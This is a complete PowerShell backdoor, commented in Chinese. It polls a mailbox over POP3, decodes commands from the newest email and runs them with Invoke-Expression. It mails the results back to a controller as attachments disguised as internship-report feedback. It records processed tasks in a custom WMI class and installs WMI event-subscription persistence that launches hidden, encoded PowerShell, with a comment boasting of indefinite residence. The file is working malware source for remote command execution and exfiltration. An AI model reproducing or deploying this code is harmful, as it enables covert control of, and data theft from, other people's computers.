$controlEmail = ""
$towho = "client@qq.com"
$popserver="pop.sina.com"
$smtpserver="smtp.sina.com"  
$Username="server@sina.com"  
$password="you password"

$CRLF = "`r`n";
$token = " "

# 登陆$Username 的 email -> check 新邮件 -> 解析邮件 -> 执行 -> 结果返回给 $towho

function Invoke-PutShell
{
	$Global:staticclass = $null
	
	function GetWMIStaicObj
	{
		Write-host "GetWMIStaicObj"
		$log = $null
		try
		{
			$log = ([WmiClass] 'root\default:Win32_ProcessOpt').Properties['ticks'].value
		}
		catch
		{
			$log = $null
			Write-Host "err 1"
			$($_.Exception.Message)
			
		}
		
		if ($Global:staticclass -eq $null)
		{
			$Global:staticclass = new-object Management.ManagementClass('root\default',$null,$null)
			$Global:staticclass.Name = ('Win32_ProcessOpt')
			$Global:staticclass.put()
			
			if ( ($log -ne $null) -and ([string]$log -ne " "))
			{
				$Global:staticclass.properties.Add(('ticks') , [string]$log)
			}
			else
			{
				$Global:staticclass.properties.Add(('ticks') , " ")
			}
			
			($Global:staticclass).put()
			Write-Host "init ok"
		}
		
		Write-host ($staticclass.properties['ticks'])
		return $Global:staticclass
	}
	
	function GetTask
	{
		$Server = new-object System.Net.Sockets.TcpClient($popserver,110)
		$Text  = $null  
		$plain = $null
		$mailid = $null
		
		if ( $Server )
		{
			# login
			try   
			{
				#初始化   
				$NetStrm = $Server.GetStream()   
				$RdStrm= new-object  System.Io.StreamReader($Server.GetStream(),[Text.Encoding]::GetEncoding("ASCII"))   
				$RdStrm.ReadLine()    | out-null
				
				#登录服务器过程   
				$Data = "USER "+ $Username+$CRLF   
				$szData = [Text.Encoding]::ASCII.GetBytes($Data.ToCharArray())  
				$NetStrm.Write($szData,0,$szData.Length)   
				$RdStrm.ReadLine()    | out-null	

				$Data = "PASS "+ $password+$CRLF   
				$szData = [System.Text.Encoding]::ASCII.GetBytes($Data.ToCharArray())  
				$NetStrm.Write($szData,0,$szData.Length)   
				$RdStrm.ReadLine()    | out-null
			 
				#向服务器发送STAT命令，从而取得邮箱的相关信息：邮件数量和大小   
				$Data = "STAT"+$CRLF;   
				$szData = [System.Text.Encoding]::ASCII.GetBytes($Data.ToCharArray())  
				$NetStrm.Write($szData,0,$szData.Length)   
				($p = $RdStrm.ReadLine())  | out-null
				
				#取最新邮件进行处理
				$p = [int32](($p -Split $token)[1])
				#Write-Host $p
				#Write-host "ok!!!"
				
				if ($p -eq 0)
				{
					return $null
				}
				
			}   
			catch  
			{   
				$($_.Exception.Message)
			}   
			
			# 获取最新的信件，当作任务进行处理
			
			try{
				$Data = ("retr {0}" + $CRLF)  -f ($p)
				$szData = [System.Text.Encoding]::ASCII.GetBytes($Data.ToCharArray())  
				$NetStrm.Write($szData,0,$szData.Length)   
				$szTemp = $RdStrm.ReadLine(); 

				#Write-Host $RdStrm.Length
		  
				#不断地读取邮件内容  
				while($szTemp[0] -ne '.')
				{  
					$Text+=$szTemp+$CRLF  
					$szTemp=$RdStrm.ReadLine()
				}
				#Write-Host $Text
			}	
			catch  
			{   
				#Write-Host "err"
				$($_.Exception.Message) 
			} 
			
			#在这里需要做一个发件人校验
			
			#解析邮件内容
			#Write-Host $Text
			#简单校验
			if ($Text -match "$towho")
			{
				$regx = [regex]"Message-ID:(.+)@"
				$mats = $regx.Matches($Text)
				
				if ($mats -and $mats[0])
				{
					$mailid = $mats[0].Groups[1].Value
					#write-host $mailid
				}
				
				$infoMail = $Text -split ($CRLF+$CRLF+$CRLF)
				
				if (-not $Text.Contains("charset=us-ascii"))
				{
					$plain= [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($infoMail[1]));
				}
				else
				{
					#$plain = $infoMail[1];
					# + =2B
					# / =2F
					# = =3D
					$plain = $infoMail[1] -replace "=2B" , "+" -replace "=2F" ,"/" -replace "=3D" ,"=" -replace $CRLF , "" -replace "=", "";
					
					$ct = $plain.Length % 4;
					if ($ct -ne 0)
					{
						$plain += "=" * (4 - $ct);
					}
						
					$plain = [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($plain));
				}
				
				#Write-host $plain
				#获得信件的信息
				
				$Data = "QUIT"+$CRLF;   
				$szData = [System.Text.Encoding]::ASCII.GetBytes($Data.ToCharArray())  
				$NetStrm.Write($szData,0,$szData.Length);   
				$RdStrm.ReadLine() | out-null
			}
			 
			#断开连接   
			$NetStrm.Close();   
			$RdStrm.Close(); 

		}
		return $plain , $mailid
	}

	function SetTask ($data,$file)
	{
		Write-host "SetTask"
		$from  = $Username
		$att = $null
		$title = "生产实习报告-初稿-修订意见"
		$msg = new-object Net.Mail.MailMessage
		$smtp = new-object Net.Mail.SmtpClient($smtpserver)
		$smtp.EnableSsl = $True
		 
		$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $password)

		$msg.From = $from
		$msg.IsBodyHTML = $true 
		
		$msg.To.Add($towho)
		$msg.Subject = $title
		$msg.Body = $data
		
		if ($file)
		{
			$att = new-object Net.Mail.Attachment($file)
			$msg.Attachments.Add($att)
		}
		
		$smtp.Send($msg)
		
		if ($att -ne $null)
			{$att.Dispose()}
	}


	#解析命令
	#目前支持功能
	# Command	 data
	# 	ex 			powershell cmd
	# 	dl			js、vbs脚本
	#  格式 		{"c":Command,"d":data}
	function Doit ($cmd)
	{
		#$cmD = ConvertFrom-Json -InputObject $bundle
		$cmD = ([xml]$cmd).ps
		$result = "Ok"
		if ($cmD)
		{
			switch ($cmD.c)
			{
				{$_ -eq "ex"}{ 
					$result = E10ec $cmD.d
				}
				{$_ -eq "dl"}{
					#write-host "do dl"
					$result = Downl0ad $cmD.d
				}
				Default { "do idle" }
			}
		}
		#write-host $result
		return $result
	}


	function Downl0ad
	{
		return "Undo"
	}

	function E10ec($c)
	{
		#字符串转
		#$c = IEX($c)
		write-host $c
		$result = Invoke-Expression $c -ErrorAction SilentlyContinue
		return $result
	}

	function Work
	{
		Write-Host "Work"
		$rep = "Ok,Done-> "
		$task = $null
		$taskid = $null

		$bundle = GetTask
		
		#Write-host $bundle
		
		if (! $bundle)
		{
			return 
		}
		
		
		$task = $bundle[0]
		$taskid = $bundle[1]
		
		Write-Host "taskid" "$taskid"
		$flag = checkedWork([string]$taskid)
		
		if ( $flag -ne $true )
		{
			$result = DOit($task)
			if (($result -eq $null) -or ([string]$result -eq ""))
			{
				#write-host $result
				$rep = [Convert]::ToBase64String( [System.Text.Encoding]::Utf8.GetBytes("[Null].") )
			}
			else
			{
				$rep += [Convert]::ToBase64String( [System.Text.Encoding]::Utf8.GetBytes([String]$result) )
			}
		
			$filename = ($env:TEMP + "\\" + [string]("uyax" +( Get-Random)%99999))
			($rep | out-FiLe $filename) | out-null

			$nothing = "--------------------------<br><p>请查附件收，针对课后作业中存在的错别自，自行正修！</p>"
			SetTask $nothing $filename
			logWork $taskid
			Remove-Item $filename -recurse
		}
	}

	function checkSpace
	{
		Write-Host "checkSpace"
		$checked = $null
		try
		{
			([WmiClass] 'root\default:Win32_ProcessOpt') | out-null
			
			if (([WmiClass] 'root\default:Win32_ProcessOpt').Properties['ticks'] -ne " ")
			{
				$checked = $true
			}
		}
		catch
		{
			$checked = $false
		}
		Write-host $checked " <--"
		return $checked
	}

	#返回是否已经做过某个任务
	function checkedWork( $workid )
	{
		Write-Host "checkedWork"
		$flag = $false

		$log = ([WmiClass] 'root\default:Win32_ProcessOpt').Properties['ticks'].value
		write-host "checkedWork" "$workid"
		if ( ([string]$log).contains([string]$workid))
		{
			$flag = $true
		}
		
		Write-Host "checkedWork -> " $flag
		return $flag
	}

	#记录work
	function logWork ($workid)
	{
		Write-Host "logWork-> " $workid
		#Write-Host $staticclass
		try
		{
			$log = ([WmiClass] 'root\default:Win32_ProcessOpt').Properties['ticks'].value
			if (! $log.contains($workid))
			{
				#$ssc  =  GetWMIStaicObj
				$ssc = ([WmiClass] 'root\default:Win32_ProcessOpt')
				Write-host $ssc.Properties
				$logg = $ssc.Properties['ticks']
				$logg.value = $logg.value + " " + $workid
				$ssc.put() | out-null
				Write-host "log commit"
			}
		}
		catch
		{
			#SaveMeWMI
			Write-Host "err 2"
			$($_.Exception.Message)
		}
	}
	function SaveMeWMI
	{
		Write-Host "SaveMeWMI"
		$fn = "SCM Opt Filter"
		$cn = "SCM Opt Consumer"
		$result = $false
		
		try
		{
			$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
			
			# 命令执行 , 执行self script :)  这样就可以无限驻留
			$EncScript = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes("calc.exe") )

			#clear me
			Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='SCM Opt Filter'" | Remove-WmiObject
			Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='SCM Opt Consumer'" | Remove-WmiObject
			Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%SCM Opt%'" | Remove-WmiObject
			# ([WmiClass] 'root\default:Win32_ProcessOpt')  | Remove-WmiObject

			$fltp = @{
				NameSpace = ('root\subscription')
				CLASS = ('__EventFilter')
				Arguments = @{ Name = $fn
					EventNameSpace = ('root\cimv2')
					QueryLanguage = ('WQL')
					Query = $Query
				}
				Erroraction = ('SilentlyContinue')
			}

			$WMIf = Set-WMIInstance @fltp | out-null

			$conp = @{
				NameSpace = ('root\subscription')
				CLASS = ('CommandLineEventConsumer')
				Arguments = @{name = $cn ; CommandlIneteMplate = ('powershell.exe -NoP -NonI -W Hidden -E ' + "$EncScript") }
				Erroraction = ('SilentlyContinue')
			}

			$WMIc = Set-WMIInstance @conp | out-null
			Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIf;Consumer=$WMIc} | out-null
			
			$result = $true
		}
		catch
		{
			write-host "err 00"
			$($_.Exception.Message)
		}
		return $result
	}
	function Main
	{
		Write-Host "Main"
		$flag = checkSpace
		
		if (($flag -ne $true)) 
		{
			write-host "in init"
			GetWMIStaicObj
			SaveMeWMI
		}	
		Work
	}
	Main
}
Invoke-PutShell